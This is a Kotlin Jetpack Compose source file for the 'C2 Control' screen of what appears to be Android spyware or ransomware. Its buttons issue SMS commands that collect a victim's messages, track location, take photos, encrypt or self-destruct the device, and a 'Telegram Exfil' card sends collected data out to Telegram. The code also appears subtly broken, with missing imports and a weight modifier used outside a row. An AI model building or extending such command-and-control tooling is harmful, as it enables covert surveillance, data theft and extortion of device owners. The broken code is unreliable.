package com.genetic.system.v3.ui.screens

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController
import com.genetic.system.v3.c2.SMSCommandHandler
import com.genetic.system.v3.engine.TelegramSender

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun C2Screen(navController: NavController) {
    var commandText by remember { mutableStateOf("") }
    var responseText by remember { mutableStateOf("") }
    val smsHandler = remember { SMSCommandHandler() }
    val telegram = remember { TelegramSender() }
    
    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("📡 C2 Control", color = Color.White) },
                navigationIcon = {
                    IconButton(onClick = { navController.popBackStack() }) {
                        Icon(Icons.Default.ArrowBack, contentDescription = null, tint = Color.White)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color(0xFF1A1A2E))
            )
        },
        containerColor = Color(0xFF0A0A0F)
    ) { padding ->
        LazyColumn(
            modifier = Modifier.fillMaxSize().padding(padding).padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF0D0D18))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("📨 SMS Command", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(
                            value = commandText,
                            onValueChange = { commandText = it },
                            label = { Text("Enter SMS command", color = Color.Gray) },
                            modifier = Modifier.fillMaxWidth(),
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = Color(0xFF4ECDC4),
                                unfocusedBorderColor = Color.Gray
                            )
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = { responseText = smsHandler.sendCommand(commandText) },
                                modifier = Modifier.weight(1f),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4ECDC4))
                            ) { Text("📤 Send") }
                            Button(
                                onClick = { commandText = "GENETIC_CMD:COLLECT_SMS" },
                                modifier = Modifier.weight(1f),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6200EE))
                            ) { Text("💬 SMS") }
                            Button(
                                onClick = { commandText = "GENETIC_CMD:START_LOCATION" },
                                modifier = Modifier.weight(1f),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF03DAC6))
                            ) { Text("📍 Loc") }
                        }
                    }
                }
            }
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF12121E))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("📤 Telegram Exfil", color = Color.White, fontSize = 16.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(8.dp))
                        Button(
                            onClick = { telegram.sendFile("data_collection.json")
                                responseText = "📤 Data sent to Telegram" },
                            modifier = Modifier.fillMaxWidth(),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0088cc))
                        ) { Text("📤 Send All Data to Telegram") }
                        Button(
                            onClick = { telegram.sendMessage("🔴 Status: Active")
                                responseText = "📨 Status sent" },
                            modifier = Modifier.fillMaxWidth(),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1A1A2E))
                        ) { Text("📨 Send Status Update") }
                    }
                }
            }
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF0A0A15))
                ) {
                    Column(modifier = Modifier.padding(12.dp)) {
                        Text("📝 Response", color = Color.Gray, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(responseText, color = Color.White, fontSize = 13.sp, modifier = Modifier.padding(8.dp))
                    }
                }
            }
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF1A0A0A))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("⚡ Quick Commands", color = Color.Gray, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(8.dp))
                        Row(horizontalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.fillMaxWidth()) {
                            CommandChip("ENCRYPT", Color.Red) { commandText = "GENETIC_CMD:ENCRYPT" }
                            CommandChip("DECRYPT", Color.Green) { commandText = "GENETIC_CMD:DECRYPT:key123" }
                            CommandChip("CAPTURE", Color(0xFFFF6B6B)) { commandText = "GENETIC_CMD:CAPTURE_PHOTO" }
                            CommandChip("DESTROY", Color(0xFFFF4444)) { commandText = "GENETIC_CMD:SELF_DESTRUCT" }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun CommandChip(label: String, color: Color, onClick: () -> Unit) {
    Surface(
        onClick = onClick,
        modifier = Modifier.weight(1f),
        color = color.copy(alpha = 0.2f),
        shape = RoundedCornerShape(8.dp)
    ) {
        Text(label, color = color, fontSize = 11.sp, fontWeight = FontWeight.Bold,
             modifier = Modifier.padding(horizontal = 8.dp, vertical = 6.dp))
    }
}
